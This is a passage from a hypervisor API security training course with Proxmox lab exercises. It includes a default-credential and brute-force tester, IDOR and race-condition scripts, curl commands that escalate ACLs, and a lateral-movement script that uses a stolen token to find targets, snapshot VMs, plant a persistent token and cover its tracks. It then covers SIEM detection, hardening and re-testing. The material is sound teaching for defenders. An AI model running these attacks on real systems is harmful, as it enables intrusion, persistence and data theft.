  username=pentester@pve password=TestPass123

# Subsequent requests use stored cookies
http --verify=no --session=proxmox \
  GET https://proxmox.lab.local:8006/api2/json/nodes

# Test with API token (no session needed)
http --verify=no \
  GET https://proxmox.lab.local:8006/api2/json/cluster/status \
  Authorization:"PVEAPIToken=pentester@pve!pentest=token-value"
```

**Custom Python testing framework:**

```python
#!/usr/bin/env python3
"""
Hypervisor API penetration testing framework.
Modular test suite for Proxmox and vCenter API assessment.
"""
import requests
import json
import time
from dataclasses import dataclass, field
from typing import Optional
requests.packages.urllib3.disable_warnings()

@dataclass
class Finding:
    title: str
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    cvss: float
    description: str
    evidence: str
    remediation: str
    cwe: str

@dataclass
class APITester:
    base_url: str
    verify_tls: bool = False
    findings: list[Finding] = field(default_factory=list)
    session: Optional[requests.Session] = None

    def __post_init__(self):
        self.session = requests.Session()
        self.session.verify = self.verify_tls

    def add_finding(self, finding: Finding):
        self.findings.append(finding)
        print(f"[{finding.severity}] {finding.title} (CVSS: {finding.cvss})")

    def report(self) -> str:
        output = "# API Security Assessment Report\n\n"
        output += f"Target: {self.base_url}\n"
        output += f"Date: {time.strftime('%Y-%m-%d %H:%M UTC', time.gmtime())}\n\n"
        for i, f in enumerate(sorted(self.findings, key=lambda x: x.cvss, reverse=True), 1):
            output += f"## Finding {i}: {f.title}\n"
            output += f"- Severity: {f.severity} | CVSS: {f.cvss}\n"
            output += f"- CWE: {f.cwe}\n"
            output += f"- Description: {f.description}\n"
            output += f"- Evidence:\n```\n{f.evidence}\n```\n"
            output += f"- Remediation: {f.remediation}\n\n"
        return output


class ProxmoxAPITester(APITester):

    def test_default_credentials(self):
        """Test for default/common credentials."""
        defaults = [
            ("root@pam", "proxmox"), ("root@pam", "password"),
            ("root@pam", "admin"), ("root@pam", "changeme"),
            ("admin@pve", "admin"), ("admin@pve", "password"),
        ]
        for user, pwd in defaults:
            resp = self.session.post(
                f"{self.base_url}/api2/json/access/ticket",
                data={"username": user, "password": pwd}
            )
            if resp.status_code == 200:
                self.add_finding(Finding(
                    title=f"Default credentials valid: {user}",
                    severity="CRITICAL",
                    cvss=9.8,
                    description=f"Account {user} accepts default password",
                    evidence=f"POST /access/ticket → 200 with {user}:{pwd}",
                    remediation="Change password immediately. Implement password policy.",
                    cwe="CWE-798: Use of Hard-coded Credentials"
                ))

    def test_brute_force_protection(self):
        """Test if rate limiting blocks brute force."""
        failures = 0
        for i in range(20):
            resp = self.session.post(
                f"{self.base_url}/api2/json/access/ticket",
                data={"username": "root@pam", "password": f"wrong{i}"}
            )
            if resp.status_code == 401:
                failures += 1
            elif resp.status_code == 429:
                print(f"  [OK] Rate limited after {i} attempts")
                return
            time.sleep(0.1)

        if failures >= 20:
            self.add_finding(Finding(
                title="No brute force protection on authentication endpoint",
                severity="HIGH",
                cvss=7.5,
                description="Authentication endpoint allows unlimited failed attempts",
                evidence=f"20 consecutive failures without rate limiting or lockout",
                remediation="Implement rate limiting (max 5 attempts/5 min). "
                           "Configure fail2ban. Enable account lockout.",
                cwe="CWE-307: Improper Restriction of Excessive Authentication Attempts"
            ))

    def test_tls_configuration(self):
        """Test TLS configuration strength."""
        import ssl
        import socket
        from urllib.parse import urlparse

        parsed = urlparse(self.base_url)
        host = parsed.hostname
        port = parsed.port or 8006

        # Test for TLS 1.0/1.1 acceptance
        for proto_name, proto_const in [("TLSv1.0", ssl.PROTOCOL_TLSv1),
                                         ("TLSv1.1", ssl.PROTOCOL_TLSv1_1)]:
            try:
                ctx = ssl.SSLContext(proto_const)
                with socket.create_connection((host, port), timeout=5) as sock:
                    with ctx.wrap_socket(sock, server_hostname=host):
                        self.add_finding(Finding(
                            title=f"Deprecated {proto_name} supported",
                            severity="MEDIUM",
                            cvss=5.3,
                            description=f"API accepts {proto_name} connections",
                            evidence=f"Successful TLS handshake with {proto_name}",
                            remediation="Disable TLS 1.0 and 1.1. Require TLS 1.2+.",
                            cwe="CWE-326: Inadequate Encryption Strength"
                        ))
            except (ssl.SSLError, OSError):
                pass  # Good — protocol rejected

    def test_privilege_escalation(self, token_header: str):
        """Test if a limited token can perform privileged operations."""
        headers = {"Authorization": token_header}

        # Attempt operations that should be denied for a monitoring token
        priv_ops = [
            ("POST", "/api2/json/access/users", {"userid": "hacker@pve", "password": "hacked"}),
            ("PUT", "/api2/json/access/acl", {"path": "/", "users": "hacker@pve", "roles": "Administrator"}),
            ("POST", "/api2/json/nodes/pve1/qemu", {"vmid": "9999", "memory": "1024"}),
            ("DELETE", "/api2/json/nodes/pve1/qemu/100", {}),
        ]

        for method, path, data in priv_ops:
            resp = getattr(self.session, method.lower())(
                f"{self.base_url}{path}", headers=headers, data=data
            )
            if resp.status_code in (200, 201):
                self.add_finding(Finding(
                    title=f"Privilege escalation: {method} {path}",
                    severity="CRITICAL",
                    cvss=8.8,
                    description=f"Limited token can perform privileged operation: {method} {path}",
                    evidence=f"{method} {path} → {resp.status_code}: {resp.text[:200]}",
                    remediation="Enforce privsep=1 on all API tokens. Audit ACLs. "
                               "Apply principle of least privilege.",
                    cwe="CWE-269: Improper Privilege Management"
                ))


# Usage
if __name__ == "__main__":
    tester = ProxmoxAPITester(base_url="https://proxmox.target.local:8006")
    tester.test_default_credentials()
    tester.test_brute_force_protection()
    tester.test_tls_configuration()
    # tester.test_privilege_escalation("PVEAPIToken=monitor@pve!metrics=token")
    print(tester.report())
```

### 9.3 Authorization Testing — IDOR and Privilege Escalation

```python
#!/usr/bin/env python3
"""
IDOR testing: Can user A access user B's VMs via direct VMID reference?
"""
import requests
requests.packages.urllib3.disable_warnings()

PROXMOX = "https://proxmox.target.local:8006"

# Authenticate as low-privilege user
resp = requests.post(f"{PROXMOX}/api2/json/access/ticket",
    data={"username": "limited@pve", "password": "UserPass123"},
    verify=False)
ticket = resp.json()["data"]["ticket"]
csrf = resp.json()["data"]["CSRFPreventionToken"]
cookies = {"PVEAuthCookie": ticket}
headers = {"CSRFPreventionToken": csrf}

# User 'limited@pve' should only access VMID 200
# Test access to VMIDs they should NOT have permission for
unauthorized_vmids = [100, 101, 102, 103, 150, 300]

for vmid in unauthorized_vmids:
    # Read configuration (information disclosure)
    r = requests.get(
        f"{PROXMOX}/api2/json/nodes/pve1/qemu/{vmid}/config",
        cookies=cookies, headers=headers, verify=False
    )
    if r.status_code == 200:
        print(f"[CRITICAL] IDOR: limited@pve can read VM {vmid} config!")

    # Attempt console access
    r = requests.post(
        f"{PROXMOX}/api2/json/nodes/pve1/qemu/{vmid}/vncproxy",
        cookies=cookies, headers=headers, verify=False
    )
    if r.status_code == 200:
        print(f"[CRITICAL] IDOR: limited@pve can access VM {vmid} console!")

    # Attempt power operation
    r = requests.post(
        f"{PROXMOX}/api2/json/nodes/pve1/qemu/{vmid}/status/stop",
        cookies=cookies, headers=headers, verify=False
    )
    if r.status_code == 200:
        print(f"[CRITICAL] IDOR: limited@pve can stop VM {vmid}!")
```

### 9.4 Business Logic Testing — Race Conditions

```python
#!/usr/bin/env python3
"""
Race condition testing: concurrent API calls to exploit TOCTOU vulnerabilities.
Example: create two VMs with the same VMID simultaneously.
"""
import requests
import threading
import time
requests.packages.urllib3.disable_warnings()

PROXMOX = "https://proxmox.target.local:8006"
TOKEN = "PVEAPIToken=test@pve!race=token-value"
HEADERS = {"Authorization": TOKEN}

results = []

def create_vm(vmid: int, thread_id: int):
    """Attempt to create a VM — race condition test."""
    resp = requests.post(
        f"{PROXMOX}/api2/json/nodes/pve1/qemu",
        headers=HEADERS,
        data={"vmid": vmid, "memory": 512, "name": f"race-{thread_id}"},
        verify=False
    )
    results.append({
        "thread": thread_id,
        "status": resp.status_code,
        "response": resp.text[:200]
    })

# Launch 10 concurrent attempts to create VM with same ID
target_vmid = 9999
threads = []
for i in range(10):
    t = threading.Thread(target=create_vm, args=(target_vmid, i))
    threads.append(t)

# Synchronize start
barrier = threading.Barrier(10)
for t in threads:
    t.start()
for t in threads:
    t.join()

# Analyze results
successes = [r for r in results if r["status"] == 200]
print(f"Successes: {len(successes)} / {len(results)}")
if len(successes) > 1:
    print("[HIGH] Race condition: multiple VMs created with same VMID!")
```

### 9.5 Reporting API Vulnerabilities

**Structured finding format:**

```markdown
## Finding: [TITLE]

| Attribute | Value |
|-----------|-------|
| Severity | CRITICAL / HIGH / MEDIUM / LOW |
| CVSS 3.1 | [Score] — [Vector String] |
| CWE | CWE-XXX: [Name] |
| Affected Endpoint | [METHOD] [URL Path] |
| Authentication Required | Yes / No |
| Reproducibility | Always / Sometimes / Rarely |

### Description
[Technical description of the vulnerability]

### Steps to Reproduce
1. [Step-by-step with exact commands]
2. ...

### Evidence
[Request/Response pairs, screenshots, timestamps]

### Impact
[What an attacker can achieve — data breach, RCE, DoS, etc.]

### Remediation
[Specific fix with configuration/code examples]

### References
- [CVE if applicable]
- [CWE link]
- [Vendor advisory]
```

---

## 10. Lab: API Security Assessment

### 10.1 Lab Environment Setup

**Requirements:**
- Proxmox VE 8.x cluster (2+ nodes) — dedicated lab, not production
- Isolated network segment (no route to production)
- Attacker workstation with: Python 3.11+, Burp Suite Community/Pro, httpie, nmap
- Dedicated test accounts with various privilege levels

**Lab network:**
```
┌─────────────────────────────────────────────────────┐
│  Lab Network: 10.99.0.0/24 (isolated)               │
│                                                      │
│  10.99.0.10 — Proxmox Node 1 (pve-lab1)            │
│  10.99.0.11 — Proxmox Node 2 (pve-lab2)            │
│  10.99.0.50 — Attacker Workstation                  │
│  10.99.0.100-110 — Test VMs                         │
│                                                      │
│  Accounts:                                           │
│  - root@pam (full admin — simulates compromised)     │
│  - admin@pve (delegated admin — test target)         │
│  - monitor@pve (read-only — test privsep)            │
│  - limited@pve (single VM access — test IDOR)        │
│  - automation@pve!cicd (API token — test scope)      │
└─────────────────────────────────────────────────────┘
```

**Account setup:**

```bash
# On Proxmox node — create lab accounts
pveum user add admin@pve --password "AdminPass2026!"
pveum user add monitor@pve --password "MonitorPass2026!"
pveum user add limited@pve --password "LimitedPass2026!"
pveum user add automation@pve --password "AutoPass2026!"

# Assign roles
pveum acl modify / --users admin@pve --roles PVEAdmin
pveum acl modify / --users monitor@pve --roles PVEAuditor
pveum acl modify /vms/200 --users limited@pve --roles PVEVMUser

# Create API tokens with different privilege separation
pveum user token add automation@pve cicd --privsep 1
pveum acl modify /vms/200 --tokens 'automation@pve!cicd' --roles PVEVMAdmin
pveum user token add monitor@pve metrics --privsep 0  # INTENTIONAL MISCONFIGURATION for testing
```

### 10.2 Exercise 1: Scan Proxmox API for Vulnerabilities

```bash
# Step 1: Port scan and service identification
nmap -sV -sC -p 8006,3128,111,22 10.99.0.10

# Step 2: Identify API version and capabilities
curl -k "https://10.99.0.10:8006/api2/json/version"
# Expected output: {"data":{"version":"8.2.x",...}}

# Step 3: Enumerate API endpoints (unauthenticated)
# Test which endpoints respond without authentication
endpoints=(
  "/api2/json/version"
  "/api2/json/cluster/status"
  "/api2/json/nodes"
  "/api2/json/access/users"
  "/api2/json/access/ticket"
  "/api2/json/access/domains"
)

for ep in "${endpoints[@]}"; do
  status=$(curl -k -s -o /dev/null -w "%{http_code}" "https://10.99.0.10:8006$ep")
  echo "$ep → $status"
done

# Step 4: TLS assessment
# Use testssl.sh or sslyze
sslyze --regular 10.99.0.10:8006

# Step 5: Check for information disclosure in error messages
curl -k -X POST "https://10.99.0.10:8006/api2/json/access/ticket" \
  -d "username=nonexistent@pam&password=wrong" -v 2>&1 | grep -i "server\|x-powered"

# Expected findings:
# - Server header reveals pveproxy version
# - Error messages may distinguish valid/invalid users
# - /api2/json/version accessible without auth (info disclosure)
# - /api2/json/access/domains reveals auth realms without auth
```

### 10.3 Exercise 2: Authentication Bypass and Privilege Escalation

```bash
# Test 1: Timing-based username enumeration
python3 << 'PYTHON'
import requests, time
requests.packages.urllib3.disable_warnings()

BASE = "https://10.99.0.10:8006"
users = ["root@pam", "admin@pve", "nonexist@pam", "ghost@pve",
         "monitor@pve", "nobody@pam"]

for user in users:
    times = []
    for _ in range(5):
        start = time.perf_counter()
        requests.post(f"{BASE}/api2/json/access/ticket",
            data={"username": user, "password": "wrong"},
            verify=False)
        times.append(time.perf_counter() - start)
    avg = sum(times) / len(times) * 1000
    print(f"{user:20s} | avg {avg:.1f}ms")
PYTHON

# Test 2: Token privilege separation bypass
# Authenticate as monitor@pve (has privsep=0 token — misconfigured)
MONITOR_TOKEN="PVEAPIToken=monitor@pve!metrics=$(cat /tmp/monitor-token)"

# Attempt to create a VM (should be denied for monitoring role)
curl -k -X POST "https://10.99.0.10:8006/api2/json/nodes/pve-lab1/qemu" \
  -H "Authorization: $MONITOR_TOKEN" \
  -d "vmid=9001&memory=512&name=escalation-test"

# Attempt to modify ACLs (critical privilege escalation)
curl -k -X PUT "https://10.99.0.10:8006/api2/json/access/acl" \
  -H "Authorization: $MONITOR_TOKEN" \
  -d "path=/&users=monitor@pve&roles=Administrator"

# Test 3: IDOR — access VMs outside assigned scope
# Authenticate as limited@pve (only authorized for VMID 200)
RESP=$(curl -k -s -X POST "https://10.99.0.10:8006/api2/json/access/ticket" \
  -d "username=limited@pve&password=LimitedPass2026!")
TICKET=$(echo "$RESP" | python3 -c "import json,sys;print(json.load(sys.stdin)['data']['ticket'])")
CSRF=$(echo "$RESP" | python3 -c "import json,sys;print(json.load(sys.stdin)['data']['CSRFPreventionToken'])")

# Try to access VM 100 (not authorized)
curl -k "https://10.99.0.10:8006/api2/json/nodes/pve-lab1/qemu/100/config" \
  -b "PVEAuthCookie=$TICKET" \
  -H "CSRFPreventionToken: $CSRF"
# Expected: 403 Forbidden (if ACLs are correct)
```

### 10.4 Exercise 3: Exploit Overprivileged API Token for Lateral Movement

```python
#!/usr/bin/env python3
"""
Lab Exercise: Demonstrate lateral movement via overprivileged API token.
Scenario: Attacker compromised a CI/CD system that stores a Proxmox token.
The token has more permissions than needed (privsep=0).
"""
import requests
import json
import base64
requests.packages.urllib3.disable_warnings()

PROXMOX = "https://10.99.0.10:8006"
# Simulated stolen token (privsep=0, inherits all user permissions)
STOLEN_TOKEN = "PVEAPIToken=automation@pve!cicd=<insert-lab-token>"
HEADERS = {"Authorization": STOLEN_TOKEN}

def api(method: str, path: str, data: dict = None) -> dict:
    resp = getattr(requests, method)(
        f"{PROXMOX}/api2/json{path}",
        headers=HEADERS, data=data, verify=False
    )
    return {"status": resp.status_code, "data": resp.json().get("data")}

print("[*] Phase 1: Reconnaissance")
# Enumerate all VMs across all nodes
nodes = api("get", "/nodes")["data"]
all_vms = []
for node in nodes:
    name = node["node"]
    vms = api("get", f"/nodes/{name}/qemu")["data"] or []
    all_vms.extend([(name, vm) for vm in vms])
    print(f"  Node {name}: {len(vms)} VMs")

print(f"\n[*] Phase 2: Identify high-value targets")
for node_name, vm in all_vms:
    vmid = vm["vmid"]
    config = api("get", f"/nodes/{node_name}/qemu/{vmid}/config")["data"]
    if config:
        name = config.get("name", "unnamed")
        # Look for domain controllers, databases, admin jump boxes
        keywords = ["dc", "ad", "sql", "db", "admin", "jump", "vault", "backup"]
        if any(kw in name.lower() for kw in keywords):
            print(f"  [!] High-value target: VM {vmid} ({name}) on {node_name}")

print(f"\n[*] Phase 3: Create snapshot for data exfiltration")
target_vmid = 100  # Identified high-value target
snap = api("post", f"/nodes/pve-lab1/qemu/{target_vmid}/snapshot",
           {"snapname": "maintenance-2026", "description": "routine"})
if snap["status"] == 200:
    print(f"  [+] Snapshot created for VM {target_vmid}")
    print("  [+] Attacker could now clone this VM or export the disk")

print(f"\n[*] Phase 4: Establish persistence")
# Create a new API token for persistence (if we have user management perms)
new_token = api("post", "/access/users/automation@pve/token/backup-monitor",
                {"privsep": "0", "expire": "0"})
if new_token["status"] == 200:
    print(f"  [+] Persistence token created: {new_token['data']}")
    print("  [+] Token has no expiry and inherits all user permissions")

print(f"\n[*] Phase 5: Cover tracks")
# Delete the snapshot we created
api("delete", f"/nodes/pve-lab1/qemu/{target_vmid}/snapshot/maintenance-2026")
print("  [+] Evidence snapshot deleted")
```

### 10.5 Exercise 4: Detect API Abuse with Audit Logging and SIEM

```bash
# Step 1: Enable comprehensive logging
# /etc/rsyslog.d/50-pve-audit.conf
cat > /etc/rsyslog.d/50-pve-audit.conf << 'EOF'
template(name="ProxmoxAudit" type="string"
  string="%TIMESTAMP:::date-rfc3339% %HOSTNAME% %programname%[%procid%]: %msg%\n")

:programname, isequal, "pvedaemon" /var/log/pve-audit.log;ProxmoxAudit
:programname, isequal, "pveproxy" /var/log/pve-access.log;ProxmoxAudit
& stop
EOF
systemctl restart rsyslog

# Step 2: Configure Proxmox firewall logging
cat >> /etc/pve/firewall/cluster.fw << 'EOF'
[OPTIONS]
enable: 1
log_level_in: info
log_level_out: info

[RULES]
IN ACCEPT -p tcp -dport 8006 -log info
EOF

# Step 3: Set up real-time log monitoring
# Terminal 1: Watch authentication events
journalctl -fu pvedaemon | grep -i "auth\|login\|ticket"

# Terminal 2: Watch API access patterns
tail -F /var/log/pve-access.log | awk '{print $1, $4, $6, $7, $9}'

# Step 4: Replay the attack from Exercise 3 and observe log entries
# Look for:
# - Rapid sequential API calls (enumeration)
# - Snapshot creation on VMs not normally managed by automation
# - Token creation events
# - Unusual source IPs or time-of-day access

# Step 5: Create correlation rule
# "If same token performs: list all VMs → read configs → create snapshot → create token
#  within 5 minutes, alert as suspected lateral movement"
```

**SIEM correlation rule (Elasticsearch DSL query):**

```json
{
  "query": {
    "bool": {
      "must": [
        { "match": { "log_type": "proxmox_api" } },
        { "range": { "@timestamp": { "gte": "now-5m" } } }
      ],
      "should": [
        { "match_phrase": { "path": "/api2/json/nodes" } },
        { "match_phrase": { "path": "/config" } },
        { "match_phrase": { "path": "/snapshot" } },
        { "match_phrase": { "path": "/access/users" } }
      ],
      "minimum_should_match": 3
    }
  },
  "aggs": {
    "by_token": {
      "terms": { "field": "authorization.keyword", "min_doc_count": 4 }
    }
  }
}
```

### 10.6 Exercise 5: Harden — Implement All Security Controls

```bash
#!/bin/bash
# proxmox-api-harden.sh — Apply all hardening controls
# Run on each Proxmox node in the cluster

set -euo pipefail

echo "[*] Phase 1: Authentication hardening"

# Force password complexity
pveum realm modify pam --comment "Enforce strong passwords via PAM"
# /etc/pam.d/common-password should already enforce complexity

# Set token expiry policy — no infinite tokens
echo "[*] Auditing tokens without expiry..."
pveum user list --output-format json | python3 -c "
import json, sys, subprocess
users = json.load(sys.stdin)
for user in users:
    uid = user['userid']
    tokens = subprocess.run(['pveum', 'user', 'token', 'list', uid, '--output-format', 'json'],
        capture_output=True, text=True)
    if tokens.returncode == 0:
        for token in json.loads(tokens.stdout):
            if token.get('expire', 0) == 0:
                print(f'  [WARN] Token without expiry: {uid}!{token[\"tokenid\"]}')
"

echo "[*] Phase 2: Rate limiting and brute force protection"

# Install and configure fail2ban
apt-get install -y fail2ban
cat > /etc/fail2ban/jail.d/proxmox.conf << 'EOF'
[proxmox]
enabled = true
port = https,8006
filter = proxmox
backend = systemd
maxretry = 3
findtime = 600
bantime = 3600
action = iptables-multiport[name=proxmox, port="https,8006"]
EOF

cat > /etc/fail2ban/filter.d/proxmox.conf << 'EOF'
[Definition]
failregex = pvedaemon\[.*authentication failure; rhost=<HOST> user=.* msg=.*
ignoreregex =
journalmatch = _SYSTEMD_UNIT=pvedaemon.service
EOF

systemctl enable --now fail2ban

echo "[*] Phase 3: TLS hardening"

# Restrict TLS to 1.2+ with strong ciphers
cat > /etc/default/pveproxy << 'EOF'
ALLOW_FROM="10.99.0.0/24"
DENY_FROM="all"
POLICY="allow"
CIPHERS="ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305"
HONOR_CIPHER_ORDER="yes"
EOF

systemctl restart pveproxy

echo "[*] Phase 4: API access restriction via firewall"

# Cluster firewall — restrict API access to management VLAN
cat >> /etc/pve/firewall/cluster.fw << 'EOF'

[IPSET management]
10.99.0.50 # Admin workstation
10.99.0.60 # CI/CD runner
10.99.0.70 # Monitoring server

[RULES]
IN ACCEPT -source +management -p tcp -dport 8006 -log info
IN DROP -p tcp -dport 8006 -log warning
EOF

echo "[*] Phase 5: Fix token privilege separation"

# Ensure all automation tokens use privsep=1
pveum user token remove monitor@pve metrics
pveum user token add monitor@pve metrics --privsep 1
pveum acl modify / --tokens 'monitor@pve!metrics' --roles PVEAuditor

echo "[*] Phase 6: Enable comprehensive audit logging"

cat > /etc/rsyslog.d/50-pve-audit.conf << 'EOF'
template(name="ProxmoxJSON" type="string"
  string="{\"timestamp\":\"%TIMESTAMP:::date-rfc3339%\",\"host\":\"%HOSTNAME%\",\"program\":\"%programname%\",\"pid\":\"%procid%\",\"msg\":\"%msg:::json%\"}\n")

:programname, isequal, "pvedaemon" /var/log/pve-audit.json;ProxmoxJSON
:programname, isequal, "pveproxy" /var/log/pve-access.json;ProxmoxJSON
:programname, isequal, "pvedaemon" @@siem.corp.local:514;ProxmoxJSON
:programname, isequal, "pveproxy" @@siem.corp.local:514;ProxmoxJSON
& stop
EOF

systemctl restart rsyslog

echo "[*] Phase 7: Disable unnecessary API features"

# Disable SPICE proxy if not used
# Disable VNC websocket if using only SPICE or noVNC via specific path

echo "[+] Hardening complete. Verify with re-test (Exercise 6)."
```

### 10.7 Exercise 6: Verify — Re-test After Hardening

```bash
#!/bin/bash
# post-hardening-verification.sh
# Run from attacker workstation AFTER hardening is applied

PROXMOX="https://10.99.0.10:8006"
PASS=0
FAIL=0

check() {
    local test_name="$1" expected="$2" actual="$3"
    if [[ "$actual" == "$expected" ]]; then
        echo "[PASS] $test_name"
        ((PASS++))
    else
        echo "[FAIL] $test_name (expected=$expected, got=$actual)"
        ((FAIL++))
    fi
}

echo "=== Post-Hardening Verification ==="
echo ""

# Test 1: Brute force protection
echo "--- Test: Brute force protection ---"
blocked=false
for i in $(seq 1 10); do
    status=$(curl -k -s -o /dev/null -w "%{http_code}" \
        -X POST "$PROXMOX/api2/json/access/ticket" \
        -d "username=root@pam&password=wrong$i")
    if [[ "$status" == "429" ]] || [[ "$status" == "000" ]]; then
        blocked=true
        break
    fi
    sleep 0.5
done
check "Brute force blocked after <10 attempts" "true" "$blocked"

# Test 2: TLS configuration
echo ""
echo "--- Test: TLS hardening ---"
tls10=$(echo | openssl s_client -connect 10.99.0.10:8006 -tls1 2>&1 | grep -c "CONNECTED")
check "TLS 1.0 rejected" "0" "$tls10"

tls12=$(echo | openssl s_client -connect 10.99.0.10:8006 -tls1_2 2>&1 | grep -c "CONNECTED")
check "TLS 1.2 accepted" "1" "$tls12"

# Test 3: Access from unauthorized IP (if testing from non-management IP)
echo ""
echo "--- Test: IP restriction ---"
# This test only works if run from an IP NOT in the management IPSET
# Uncomment if testing from unauthorized network:
# unauth_status=$(curl -k -s -o /dev/null -w "%{http_code}" "$PROXMOX/api2/json/version")
# check "API inaccessible from unauthorized IP" "000" "$unauth_status"

# Test 4: Token privilege separation
echo ""
echo "--- Test: Token privsep enforcement ---"
MONITOR_TOKEN="PVEAPIToken=monitor@pve!metrics=$(cat /tmp/monitor-token-new)"

# Monitor token should NOT be able to create VMs
create_status=$(curl -k -s -o /dev/null -w "%{http_code}" \
    -X POST "$PROXMOX/api2/json/nodes/pve-lab1/qemu" \
    -H "Authorization: $MONITOR_TOKEN" \
    -d "vmid=9999&memory=512&name=privsep-test")
check "Monitor token cannot create VMs" "403" "$create_status"

# Monitor token should NOT be able to modify ACLs
acl_status=$(curl -k -s -o /dev/null -w "%{http_code}" \
    -X PUT "$PROXMOX/api2/json/access/acl" \
    -H "Authorization: $MONITOR_TOKEN" \
    -d "path=/&users=monitor@pve&roles=Administrator")
check "Monitor token cannot modify ACLs" "403" "$acl_status"

# Test 5: IDOR prevention
echo ""
echo "--- Test: IDOR prevention ---"
RESP=$(curl -k -s -X POST "$PROXMOX/api2/json/access/ticket" \
    -d "username=limited@pve&password=LimitedPass2026!")
TICKET=$(echo "$RESP" | python3 -c "import json,sys;print(json.load(sys.stdin)['data']['ticket'])")
CSRF=$(echo "$RESP" | python3 -c "import json,sys;print(json.load(sys.stdin)['data']['CSRFPreventionToken'])")

idor_status=$(curl -k -s -o /dev/null -w "%{http_code}" \
    "$PROXMOX/api2/json/nodes/pve-lab1/qemu/100/config" \
    -b "PVEAuthCookie=$TICKET" \
    -H "CSRFPreventionToken: $CSRF")
check "Limited user cannot access unauthorized VM config" "403" "$idor_status"

# Test 6: Audit logging operational
echo ""
echo "--- Test: Audit logging ---"
# Generate a known event and verify it appears in logs
curl -k -s -X POST "$PROXMOX/api2/json/access/ticket" \
    -d "username=verify-logging@pam&password=wrong" > /dev/null 2>&1
sleep 2
# Check on the Proxmox node (requires SSH access for verification)
log_present=$(ssh root@10.99.0.10 "grep -c 'verify-logging' /var/log/pve-audit.json 2>/dev/null || echo 0")
check "Failed auth logged to audit file" "1" "$([ $log_present -ge 1 ] && echo 1 || echo 0)"

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
if [[ $FAIL -gt 0 ]]; then
    echo "[!] Some hardening controls are not effective. Review failed tests."
    exit 1
else
    echo "[+] All hardening controls verified successfully."
    exit 0
fi
```

---

## Summary of Key Principles

1. **Treat the management API as the crown jewel** — its compromise equals total infrastructure compromise. Protect it accordingly.

2. **Zero trust for API clients** — even authenticated requests from known service accounts must be authorized at the resource level. Never trust a token just because it is valid.

3. **Privilege separation is non-negotiable** — every API token must use `privsep=1` (Proxmox) or custom least-privilege roles (vCenter). Default to deny.

4. **Defense in depth for API security:**
   - Network layer: firewall, IP allowlist, VPN/mTLS
   - Transport layer: TLS 1.2+ with strong ciphers
   - Authentication layer: MFA, short-lived tokens, rate limiting
   - Authorization layer: RBAC, path-based ACLs, privilege separation
   - Application layer: input validation, output encoding
   - Monitoring layer: audit logging, anomaly detection, automated response

5. **Automation credentials are attack surface** — Terraform state, Ansible vaults, CI/CD secrets, and GitOps configurations all store hypervisor credentials. Protect them with the same rigor as the API itself.

6. **Continuous verification** — hardening is not a one-time event. Regular penetration testing, automated compliance scanning, and red team exercises maintain security posture against evolving threats.

---

## References

- VMware vSphere 8.0 API Reference: https://developer.vmware.com/apis/vsphere-automation/latest/
- Proxmox VE API Documentation: https://pve.proxmox.com/pve-docs/api-viewer/
- NIST SP 800-125A: Security Recommendations for Server-Based Hypervisor Platforms
- CIS Benchmark for VMware ESXi 8.0 v1.0
- OWASP API Security Top 10 (2023)
- CVE-2021-21985: https://nvd.nist.gov/vuln/detail/CVE-2021-21985
- CVE-2021-22005: https://nvd.nist.gov/vuln/detail/CVE-2021-22005
- CVE-2023-20858: https://nvd.nist.gov/vuln/detail/CVE-2023-20858
- MITRE ATT&CK: Exploitation of Remote Services (T1210)
- MITRE ATT&CK: Valid Accounts (T1078)
